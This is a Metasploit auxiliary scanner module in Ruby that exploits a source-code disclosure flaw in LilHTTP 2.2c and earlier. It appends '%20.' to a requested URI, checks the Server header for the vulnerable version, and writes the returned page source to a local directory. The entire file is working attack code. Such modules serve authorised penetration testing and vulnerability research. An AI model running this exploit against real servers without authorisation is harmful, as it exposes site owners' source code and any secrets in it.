##
# $Id: lilhttp_source_disclosure.rb 12196 2011-05-27 00:51:33Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'LilHTTP Source Code Disclosure/Download',
			'Description'    => %q{
					This module exploits a source code disclosure/download vulnerability in
				versions 2.2c and prior of LilHTTP.
			},
			'Version'        => '$Revision: 12196 $',
			'References'     =>
				[
					[ 'URL', 'http://www.summitcn.com/lilhttp/lildocs.html' ]
				],
			'Author'         =>
				[
					'Treasure Priyamal', 
					'http://treasuresec.com',
					'treasure[at]treasuresec.com'

				],
			'License'        =>  MSF_LICENSE)

		register_options(
			[
				OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/index.html']),
				OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '/home/zero']),
			], self.class)
	end

	def target_url
		"http://#{vhost}:#{rport}#{datastore['URI']}"
	end

	def run_host(ip)
		uri = datastore['URI']
		path_save = datastore['PATH_SAVE']

		vuln_versions = [
			"LilHTTP/2.2c" # Only Tested on 2.2c version might work on others versions too
		]

		disclosure = "%20."

		begin
			res = send_request_raw({
				'method'  => 'GET',
				'uri'     => "/#{uri}#{disclosure}",
			}, 25)

			version = res.headers['Server'] if res

			if vuln_versions.include?(version)
				print_good("#{target_url} - LilHTTP - Vulnerable version: #{version}")

				if (res and res.code == 200)

					print_good("#{target_url} - LilHTTP - Getting the source of page #{uri}")

					save_source = File.new("#{path_save}#{uri}","w")
					save_source.puts(res.body.to_s)
					save_source.close

					print_status("#{target_url} - LilHTTP - File successfully saved: #{path_save}#{uri}")	if (File.exists?("#{path_save}#{uri}"))

				else
					print_error("http://#{vhost}:#{rport} - LilHTTP - Unrecognized #{res.code} response")
					return

				end

			else
				if version =~ /LilHTTP/
					print_error("#{target_url} - LilHTTP - Cannot exploit: the remote server is not vulnerable - Version #{version}")
				else
					print_error("#{target_url} - LilHTTP - Cannot exploit: the remote server is not LilHTTP")
				end
				return

			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end

end
